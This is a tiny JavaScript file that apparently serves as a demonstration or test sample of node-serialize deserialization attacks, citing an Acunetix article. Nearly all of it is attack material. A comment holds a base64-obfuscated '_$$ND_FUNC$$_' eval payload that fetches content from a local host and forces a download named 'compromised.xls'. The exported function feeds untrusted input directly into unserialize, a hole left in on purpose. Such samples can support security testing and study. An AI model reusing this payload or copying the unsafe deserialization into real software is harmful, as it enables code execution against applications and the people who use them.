// https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/


var serialize = require('node-serialize');

/* _$$ND_FUNC$$_eval(atob('ZmV0Y2goImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMCIpLnRoZW4oYT0+YS5ibG9iKCkpLnRoZW4oZnVuY3Rpb24oYSl7Y29uc3QgYj13aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbYV0se3R5cGU6ImFwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbCJ9KSksYz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJhIik7Yy5ocmVmPWIsYy5zZXRBdHRyaWJ1dGUoImRvd25sb2FkIiwiY29tcHJvbWlzZWQueGxzIiksZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjKSxjLmNsaWNrKCl9KQoK'))
*/

export default function(value) {
  var obj = { path: value };
  serialize.unserialize(obj);
}